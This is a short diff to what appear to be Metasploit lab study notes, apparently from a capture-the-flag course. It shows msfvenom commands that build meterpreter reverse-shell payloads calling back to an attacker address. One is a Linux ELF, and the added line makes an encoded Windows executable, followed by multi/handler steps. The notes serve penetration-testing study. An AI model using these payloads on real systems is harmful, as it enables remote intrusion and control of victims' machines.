@@ -51,6 +51,9 @@ LPORT specifies the listening port on the attackers machine
 - What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell ?
 `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`
 
+- meterpreter reverse shell for a x86 windows machine
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.112.115 LPORT=3333 -f exe -o reverse.exe`
+
 ## multi/handler
 - launch msfconsole
 - use multi/handler
